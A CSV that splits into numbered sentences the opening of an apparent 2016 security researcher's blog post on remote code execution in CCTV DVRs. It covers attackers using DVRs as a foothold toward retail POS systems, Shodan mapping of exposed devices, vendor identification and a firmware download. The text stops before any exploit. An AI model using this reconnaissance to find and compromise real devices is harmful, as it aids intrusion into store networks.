Number,Content
"""Sentence 1","
tuesday, march 22, 2016
remote code execution in cctv-dvr affecting over 70 different vendors

this post is going to be a follow up from a research which dates back to december 2014, called the backoff pos trojan operation."
"""Sentence 2","back then, one of the key conclusions highlighted from the report is that fraudsters are adopting new tactics in order to attack retailers."
"""Sentence 3","this new attack vector is to compromise dvr boxes, which is the heart component of any cctv system."
"""Sentence 4","this was allowing them to achieve two goals at once-
verify a targeted host actually belongs to a retailer."
"""Sentence 5","get a foothold inside the local network, one step closer to the pos station."
"""Sentence 6","surveillance cameras, the first line of security in the physical world, are the virtual's weakest link?this sparks an amusing irony."
"""Sentence 7","when the old fashion thieves used to physically break into stores, on their way to the cashier they had to try and avoid or neutralize any surveillance equipment."
"""Sentence 8",the digital thieves are entering the store through them.
"""Sentence 9",truly hollywood  material.
"""Sentence 10","got me curious 

so this was as far as the backoff research paper went."
"""Sentence 11",but these cctv systems caught my curiosity.
"""Sentence 12","i had two questions in mind;
what is their distribution across the net?"
"""Sentence 13",how are they being compromised?
"""Sentence 14","using the data i've gathered from the c&c server of over thousand infected machines, i started mapping the open services/ports."
"""Sentence 15",i soon discovered a lot of them had port 81/82 open in addition to port 8000. they were http servers identifying as cross web server.
"""Sentence 16","and their main web page looked like this -




a quick shodan query, revealed their distribution; a total of over 30,000(!)."
"""Sentence 17",quite a lot and yet i'm sure this is only a small portion of them.
"""Sentence 18",vendor?
"""Sentence 19",next thing i want to know is which manufacturer is behind these cctv equipment.
"""Sentence 20","and so one grep led to another-

webclient.html:

?"
"""Sentence 21","1
<script id= gt= live_js= lt= script= src=script/live.js type=text/javascript>

script/live.js:

?"
"""Sentence 22","1
<img style=cursor:auto; src = logo/logo.png>

and viola!"
"""Sentence 23","the logo suggests this is an israeli company selling cctv systems, but comments all over the code actually says it was made in china."
"""Sentence 24",so i decided to pay their website a visit.
"""Sentence 25","navigating through their website, i encountered the download section which offers firmware update for these dvr boxes."
"""Sentence 26",sweet!
"""Sentence 27","let the bug hunt begin..

download."
"""Sentence 28",unzip.
"""Sentence 29","floop -

?"
"""Sentence 30","1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
total 8684
drwx------  8 exodus exodus    4096 feb 10 18:26 ."
